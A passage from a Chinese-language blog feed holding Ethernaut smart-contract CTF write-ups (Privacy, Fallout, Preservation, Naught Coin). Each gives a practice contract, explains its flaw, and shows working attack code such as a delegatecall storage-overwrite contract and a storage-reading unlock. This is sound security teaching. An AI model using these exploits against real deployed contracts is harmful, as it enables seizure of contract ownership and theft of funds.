punctuation">(</span><span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> _data<span class="token punctuation">)</span> <span class="token punctuation">{</span>    data <span class="token operator">=</span> _data<span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token builtin">bytes16</span> _key<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>_key <span class="token operator">==</span> <span class="token builtin">bytes16</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    locked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment">/*    A bunch of super advanced solidity algorithms...      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU  */</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>关键是找到 <code>data</code> 的内容</p><p>反编译一下合约</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Palkeoramix decompiler. </span><span class="token keyword">def</span> storage<span class="token punctuation">:</span>  locked <span class="token keyword">is</span> uint8 at storage <span class="token number">0</span>  ID <span class="token keyword">is</span> uint256 at storage <span class="token number">1</span>  stor5 <span class="token keyword">is</span> uint256 at storage <span class="token number">5</span><span class="token keyword">def</span> <span class="token function">ID</span><span class="token punctuation">(</span><span class="token punctuation">)</span> payable<span class="token punctuation">:</span>   <span class="token keyword">return</span> ID<span class="token keyword">def</span> <span class="token function">locked</span><span class="token punctuation">(</span><span class="token punctuation">)</span> payable<span class="token punctuation">:</span>   <span class="token keyword">return</span> <span class="token builtin">bool</span><span class="token punctuation">(</span>locked<span class="token punctuation">)</span><span class="token comment">#</span><span class="token comment">#  Regular functions</span><span class="token comment">#</span><span class="token keyword">def</span> <span class="token function">_fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> payable<span class="token punctuation">:</span> <span class="token comment"># default function</span>  revert<span class="token keyword">def</span> <span class="token function">unlock</span><span class="token punctuation">(</span>bytes16 _param1<span class="token punctuation">)</span> payable<span class="token punctuation">:</span>   require calldata<span class="token punctuation">.</span>size <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">&gt;=</span>ΓÇ▓ <span class="token number">32</span>  require _param1 <span class="token operator">==</span> Mask<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> _param1<span class="token punctuation">)</span>  require Mask<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> stor5<span class="token punctuation">)</span> <span class="token operator">==</span> Mask<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> _param1<span class="token punctuation">)</span>  locked <span class="token operator">=</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>基本可以确定 <code>data</code> 处在第五个位置</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span><span class="token function">getStorageAt</span><span class="token punctuation">(</span>contract<span class="token punctuation">.</span>address<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token comment">// '0x6e47d7faa2814b775ae3311ea321f477736ab7be6d60f7a98c663686784b548e'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>获得到 <code>data</code> 的内容</p><p>编写下攻击合约</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: UNLICENSE</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.7</span><span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">Privacy</span> <span class="token punctuation">{</span>  <span class="token keyword">function</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token builtin">bytes16</span> _key<span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">Hacker</span> <span class="token punctuation">{</span><span class="token comment">// 插入目标地址以及上面获取到的数据</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _address<span class="token punctuation">,</span><span class="token builtin">bytes32</span> _data<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Privacy targetContract <span class="token operator">=</span> <span class="token function">Privacy</span><span class="token punctuation">(</span>_address<span class="token punctuation">)</span><span class="token punctuation">;</span>    targetContract<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token builtin">bytes16</span><span class="token punctuation">(</span>_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="相关阅读"><a href="#相关阅读" class="headerlink" title="相关阅读"></a>相关阅读</h2>]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut - Fallout</title>
      <link href="/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-fallout/"/>
      <url>/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-fallout/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut-Fallout"><a href="#Ethernaut-Fallout" class="headerlink" title="Ethernaut - Fallout"></a>Ethernaut - Fallout</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><ol><li>获得这个合约的所有权</li></ol><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'openzeppelin-contracts-06/math/SafeMath.sol'</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Fallout</span> <span class="token punctuation">{</span>    <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span>  <span class="token keyword">mapping</span> <span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint</span><span class="token punctuation">)</span> allocations<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">payable</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>  <span class="token comment">/* constructor */</span>  <span class="token keyword">function</span> <span class="token function">Fal1out</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    allocations<span class="token punctuation">[</span>owner<span class="token punctuation">]</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">modifier</span> onlyOwner <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>            msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">,</span>            <span class="token string">"caller is not the owner"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">allocate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>    allocations<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> allocations<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">sendAllocation</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> allocator<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>allocations<span class="token punctuation">[</span>allocator<span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    allocator<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>allocations<span class="token punctuation">[</span>allocator<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">collectAllocations</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">{</span>    msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">allocatorBalance</span><span class="token punctuation">(</span><span class="token builtin">address</span> allocator<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> allocations<span class="token punctuation">[</span>allocator<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h2><p>审计源码</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">/* constructor */</span><span class="token keyword">function</span> <span class="token function">Fal1out</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>  owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  allocations<span class="token punctuation">[</span>owner<span class="token punctuation">]</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只有这个一处修改了 <code>owner</code> 的信息，而且可以执行进行外部调用</p><p>写一个接口 <code>at address</code> 后调用即可</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">Fallout</span> <span class="token punctuation">{</span>  <span class="token keyword">function</span> <span class="token function">Fal1out</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221118011515.png"></p><p>随后提交该实例即可</p><p><img src="/../../../../pic/Pasted%20image%2020221118011707.png"></p>]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut - Preservation</title>
      <link href="/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-preservation/"/>
      <url>/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-preservation/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut-Preservation"><a href="#Ethernaut-Preservation" class="headerlink" title="Ethernaut - Preservation"></a>Ethernaut - Preservation</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><ol><li>尝试取得合约的所有权（owner）</li></ol><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Preservation</span> <span class="token punctuation">{</span>  <span class="token comment">// public library contracts </span>  <span class="token builtin">address</span> <span class="token keyword">public</span> timeZone1Library<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> timeZone2Library<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>   <span class="token builtin">uint</span> storedTime<span class="token punctuation">;</span>  <span class="token comment">// Sets the function signature for delegatecall</span>  <span class="token builtin">bytes4</span> <span class="token keyword">constant</span> setTimeSignature <span class="token operator">=</span> <span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"setTime(uint256)"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _timeZone1LibraryAddress<span class="token punctuation">,</span> <span class="token builtin">address</span> _timeZone2LibraryAddress<span class="token punctuation">)</span> <span class="token punctuation">{</span>    timeZone1Library <span class="token operator">=</span> _timeZone1LibraryAddress<span class="token punctuation">;</span>     timeZone2Library <span class="token operator">=</span> _timeZone2LibraryAddress<span class="token punctuation">;</span>     owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  <span class="token punctuation">}</span>   <span class="token comment">// set the time for timezone 1</span>  <span class="token keyword">function</span> <span class="token function">setFirstTime</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _timeStamp<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>    timeZone1Library<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>setTimeSignature<span class="token punctuation">,</span> _timeStamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment">// set the time for timezone 2</span>  <span class="token keyword">function</span> <span class="token function">setSecondTime</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _timeStamp<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>    timeZone2Library<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>setTimeSignature<span class="token punctuation">,</span> _timeStamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// Simple library contract to set the time</span><span class="token keyword">contract</span> <span class="token class-name">LibraryContract</span> <span class="token punctuation">{</span>  <span class="token comment">// stores a timestamp </span>  <span class="token builtin">uint</span> storedTime<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">setTime</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _time<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>    storedTime <span class="token operator">=</span> _time<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解过程"><a href="#题解过程" class="headerlink" title="题解过程"></a>题解过程</h2><p><code>delegatecall</code> 调用方法，当修改变量值时，底层上修改的是对应插槽位置的值</p><p>例如本题中调用 setTime 修改的为 storedTime 变量的值，而该变量在 LibraryContract 的 Stroge 中处于第一个插槽中的位置，于是当 Preservation 合约调用该方法修改值时也将为修改第一个插槽处变量的位置即 timeZone1Library 的值</p><p>通过这样可以实现变量覆盖操作从而执行我们想要执行的任意函数</p><p>编写攻击合约</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: UNLICENSE</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">LibraryContractHacker</span> <span class="token punctuation">{</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> timeZone1Library<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> timeZone2Library<span class="token punctuation">;</span>  <span class="token builtin">uint</span> owner<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">setTime</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _time<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>    owner <span class="token operator">=</span> _time<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">Hacker</span> <span class="token punctuation">{</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> targetAddress<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> hackerAddress<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> myAddress<span class="token punctuation">;</span>    <span class="token keyword">event</span> <span class="token function">Log</span><span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _target<span class="token punctuation">,</span> <span class="token builtin">address</span> _hacker<span class="token punctuation">)</span> <span class="token punctuation">{</span>    targetAddress <span class="token operator">=</span> _target<span class="token punctuation">;</span>    hackerAddress <span class="token operator">=</span> _hacker<span class="token punctuation">;</span>    myAddress <span class="token operator">=</span> <span class="token number">0x38Ba28Edb35c661297F49FDc91d935aefdCE4403</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>    <span class="token punctuation">(</span><span class="token builtin">bool</span> success1<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">memory</span> data1<span class="token punctuation">)</span> <span class="token operator">=</span> targetAddress<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"setFirstTime(uint256)"</span><span class="token punctuation">,</span> hackerAddress<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">emit</span> <span class="token function">Log</span><span class="token punctuation">(</span>success1<span class="token punctuation">,</span> data1<span class="token punctuation">,</span> hackerAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token builtin">bool</span> success2<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">memory</span> data2<span class="token punctuation">)</span> <span class="token operator">=</span> targetAddress<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"setFirstTime(uint256)"</span><span class="token punctuation">,</span> myAddress<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">emit</span> <span class="token function">Log</span><span class="token punctuation">(</span>success2<span class="token punctuation">,</span> data2<span class="token punctuation">,</span> myAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut - Naught Coin</title>
      <link href="/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-naught-coin/"/>
      <url>/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-naught-coin/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut-Naught-Coin"><a href="#Ethernaut-Naught-Coin" class="headerlink" title="Ethernaut - Naught Coin"></a>Ethernaut - Naught Coin</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><ol><li>NaughtCoin 是一种 ERC20 代币，而且您已经持有这些代币。问题是您只能在 10 年之后才能转移它们。您能尝试将它们转移到另一个地址，以便您可以自由使用它们吗？通过将您的代币余额变为 0 来完成此关卡。</li></ol><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/token/ERC20/ERC20.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">NaughtCoin</span> <span class="token keyword">is</span> ERC20 <span class="token punctuation">{</span>  <span class="token comment">// string public constant name = 'NaughtCoin';</span>  <span class="token comment">// string public constant symbol = '0x0';</span>  <span class="token comment">// uint public constant decimals = 18;</span>  <span class="token builtin">uint</span> <span class="token keyword">public</span> timeLock <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token number">365</span> days<span class="token punctuation">;</span>  <span class="token builtin">uint256</span> <span class="token keyword">public</span> INITIAL_SUPPLY<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> player<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _player<span class="token punctuation">)</span>   <span class="token function">ERC20</span><span class="token punctuation">(</span><span class="token string">'NaughtCoin'</span><span class="token punctuation">,</span> <span class="token string">'0x0'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    player <span class="token operator">=</span> _player<span class="token punctuation">;</span>    INITIAL_SUPPLY <span class="token operator">=</span> <span class="token number">1000000</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">10</span><span class="token operator">**</span><span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token function">decimals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// _totalSupply = INITIAL_SUPPLY;</span>    <span class="token comment">// _balances[player] = INITIAL_SUPPLY;</span>    <span class="token function">_mint</span><span class="token punctuation">(</span>player<span class="token punctuation">,</span> INITIAL_SUPPLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">emit</span> <span class="token function">Transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> player<span class="token punctuation">,</span> INITIAL_SUPPLY<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _value<span class="token punctuation">)</span> override <span class="token keyword">public</span> lockTokens <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    super<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>_to<span class="token punctuation">,</span> _value<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span>  <span class="token keyword">modifier</span> <span class="token function">lockTokens</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> player<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">require</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>timestamp <span class="token operator">&gt;</span> timeLock<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>     <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解过程"><a href="#题解过程" class="headerlink" title="题解过程"></a>题解过程</h2><p>调用到的内容链接：<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/token/ERC20">Github</a></p><p>查看 ERC20 的 ABI：<a href="https://docs.openzeppelin.com/contracts/4.x/api/token/erc20">Link</a></p><p><img src="/../../../../pic/Pasted%20image%2020221118202644.png"></p><p>可以看到存在两个交易合约，而题目中只实现了一个，也就是说我们可以通过另一个方法来进行转账操作</p><p><img src="/../../../../pic/Pasted%20image%2020221118203001.png"></p><p>调用规则也很简单</p><p>不过调用之前先使用 approve 方法修改一下限额</p><p><img src="/../../../../pic/Pasted%20image%2020221118205754.png"></p><p>ATADDRESS 调用之后</p><p><img src="/../../../../pic/Pasted%20image%2020221118205846.png"></p><p>出现很多功能</p><p><img src="/../../../../pic/Pasted%20image%2020221118205914.png"></p><p>先修改限额</p><p><img src="/../../../../pic/Pasted%20image%2020221118205953.png"></p><p>然后再调用 transferFrom 进行转账</p><p><img src="/../../../../pic/Pasted%20image%2020221118210127.png"></p><p><img src="/../../../../pic/Pasted%20image%2020221118210135.png"></p><p>已经成功实现转账功能</p><p>提交实例即可</p><h2 id="相关阅读"><a href="#相关阅读" class="headerlink" title="相关阅读"></a>相关阅读</h2><p><a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md</a></p><p><a href="https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#IERC20-approve-address-uint256-">https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#IERC20-approve-address-uint256-</a></p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/token/ERC20">https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/token/ERC20</a></p>]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
